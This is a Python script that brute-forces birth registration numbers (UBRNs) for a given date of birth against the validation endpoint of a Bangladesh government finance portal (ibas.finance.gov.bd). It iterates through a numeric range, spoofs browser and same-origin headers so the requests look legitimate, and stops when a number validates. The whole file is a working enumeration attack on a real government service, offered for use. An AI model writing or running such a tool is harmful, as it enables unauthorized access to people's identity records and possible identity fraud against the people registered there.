import requests
import json

# ANSI escape codes for colored output
GREEN = "\033[92m"
RESET = "\033[0m"

# Taking user input for UBRN range and date
start_ubrn = int(input("Enter the start UBRN: "))
end_ubrn = int(input("Enter the end UBRN: "))
dob = input("Enter the date (YYYY-MM-DD): ")  # Full date input

url = "https://ibas.finance.gov.bd/acs/general/BrnValidate"

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua-platform': "\"Android\"",
    'X-Requested-With': "XMLHttpRequest",
    'sec-ch-ua': "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
    'sec-ch-ua-mobile': "?1",
    'Origin': "https://ibas.finance.gov.bd",
    'Sec-Fetch-Site': "same-origin",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://ibas.finance.gov.bd/acs/general/sales",
    'Accept-Language': "en-US,en;q=0.9"
}

# Iterating through possible UBRN values
for ubrn in range(start_ubrn, end_ubrn + 1):
    try:
        payload = {"ubrn": str(ubrn), "dob": dob}
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        response_data = response.json()

        response_code = response_data.get("responseCode")
        print(f"Trying UBRN: {ubrn} -> Response Code: {response_code}")

        if response_code == "0":  # If response code is "0", print success in GREEN
            print(GREEN + "Successfully processed!" + RESET)
            exit()

        if response_code == "SUCCESS":  # Adjust based on actual success response
            print(f"Valid UBRN found: {ubrn}")
            exit()  # Stop execution if a valid UBRN is found

    except Exception as e:
        print(f"Error with UBRN {ubrn}: {e}")
